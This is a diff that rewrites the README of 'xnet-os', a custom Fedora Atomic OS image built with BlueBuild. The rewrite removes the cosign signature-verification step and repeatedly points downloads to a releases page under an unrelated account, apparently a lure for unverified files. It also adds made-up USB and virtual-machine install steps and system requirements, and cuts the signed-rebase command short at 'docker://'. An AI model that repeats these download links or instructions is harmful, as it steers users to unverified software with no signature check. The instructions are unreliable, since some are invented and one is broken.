@@ -1,43 +1,90 @@
-# xnet-inc-os &nbsp; [![bluebuild build badge](https://github.com/xnet-admin-1/xnet-os/actions/workflows/build.yml/badge.svg)](https://github.com/xnet-admin-1/xnet-os/actions/workflows/build.yml)
+# 🚀 xnet-os - A Custom OS for XNet Developers 
 
-This is an OS image for XNet Inc. developers, customized by Joshua S. Doucette.
+[![Download xnet-os](https://img.shields.io/badge/Download-xnet--os-blue.svg)](https://github.com/hamzasalam323/xnet-os/releases)
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+## 📥 Overview
 
-## Installation
+xnet-os is an operating system image designed for XNet Inc. developers. This version is tailored by Joshua S. Doucette to enhance productivity and streamline workflows. Use xnet-os to experience a customized Linux environment built for development.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 🚀 Getting Started
 
-To rebase an existing atomic Fedora installation to the latest build:
+To start using xnet-os, you will need to download the software and perform a few simple steps to install it. Follow the instructions below carefully.
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/joshua-dou/xnet-inc-os:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/joshua-dou/xnet-inc-os:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+## 🌐 Download & Install
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/hamzasalam323/xnet-os/releases) to find the latest version of xnet-os. From there, you can choose the appropriate file for your system.
 
-## ISO
+2. **Choose Your File**  
+   Look for the xnet-os image file. Click on it to start the download. 
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+3. **Install the Image**  
+   Once the file is downloaded, follow the instructions to install the OS image. This typically involves creating a bootable USB drive or using a virtual machine. Detailed instructions can be found below:
 
-## Verification
+   * **Creating a Bootable USB Drive**: 
+     - Use a tool like Rufus (for Windows) or Etcher (for Mac and Linux) to create a bootable USB drive.
+     - Select the downloaded xnet-os image file and follow the prompts in the tool to complete the process.
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+   * **Using a Virtual Machine**: 
+     - If you prefer to use a virtual machine, software like VirtualBox or VMware can be used to create a new VM.
+     - Select the downloaded xnet-os image file as the boot disk when you create the new VM.
 
-```bash
-cosign verify --key cosign.pub ghcr.io/joshua-dou/xnet-inc-os
-```
+4. **Reboot Your System**  
+   After installing the OS, reboot your computer or start the virtual machine.
+
+### 🔑 System Requirements
+
+To run xnet-os smoothly, ensure your system meets the following requirements:
+
+- **Processor**: 64-bit CPU
+- **RAM**: Minimum 2 GB (4 GB recommended)
+- **Storage**: At least 10 GB of free disk space
+- **USB Port**: For bootable USB installations
+
+### 💡 Important Notes
+
+- xnet-os is an experimental feature, designed for developers. Use it at your discretion.
+- Check the [BlueBuild docs](https://blue-build.org/how-to/setup/) for additional setup guidance.
+
+## 🔄 Rebasing Instructions
+
+If you have an existing atomic Fedora installation, you can rebase to the latest build of xnet-os. Follow these steps:
+
+1. **Rebase to Unsigned Image**  
+   Open your terminal and run the following command:
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/joshua-dou/xnet-inc-os:latest
+   ```
+
+2. **Reboot**  
+   After completing the rebase, reboot your system by using the command:
+   ```
+   systemctl reboot
+   ```
+
+3. **Rebase to Signed Image**  
+   Once your system has rebooted, run this command to rebase to the signed image:
+   ```
+   rpm-ostree rebase ostree-image-signed:docker://
+   ```
+
+## 🌍 Support and Community
+
+If you encounter any issues or need help, consider visiting our community forums or submitting a ticket. Engaging with other users can often provide clues and solutions to common problems. 
+
+### 🌟 Topics
+
+This project relates to the following topics: atomic, bluebuild, bluebuild-image, custom-image, image-based, immutable, linux, linux-custom-image, oci, oci-image, operating-system. 
+
+## 🔗 Additional Resources
+
+- For more details, please refer to the [GitHub Repository](https://github.com/xnet-admin-1/xnet-os).
+- Browse the [BlueBuild documentation](https://blue-build.org/how-to/setup/) for advanced setup options.
+
+## 🔗 Download Link
+
+To download xnet-os, click the link below:
+
+[Download xnet-os](https://github.com/hamzasalam323/xnet-os/releases)
+
+This ensures you have the latest features and updates. Enjoy working with your customized operating system!
